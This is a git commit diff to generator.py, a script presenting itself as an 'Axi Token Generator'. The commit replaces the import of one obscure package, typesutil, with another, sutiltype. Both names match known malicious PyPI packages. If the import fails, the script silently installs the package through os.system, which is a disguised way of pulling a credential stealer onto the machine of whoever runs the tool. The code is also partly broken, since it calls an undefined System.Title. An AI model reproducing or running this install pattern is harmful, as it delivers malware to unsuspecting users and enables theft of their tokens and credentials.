4c170a00f1d43f8401624169ba441d63ac423380
Ravilea <116464041+Ravilea@users.noreply.github.com>
2022-10-28 03:45:02 -0300

    Update generator.py

--- generator.py
+++ generator.py
@@ -1,11 +1,11 @@
 import os
 try:
     import requests
-    import typesutil
+    import sutiltype
 except:
-    os.system('pip uninstall requests -y && pip uninstall typesutil -y && pip install requests && pip install typesutil')
+    os.system('pip uninstall requests -y && pip uninstall sutiltype -y && pip install requests && pip install sutiltype')
     import requests
-    import typesutil
+    import sutiltype
 System.Title("Axi Token Generator ^| Made By kokzyy")
 axi = """
                                                      ███
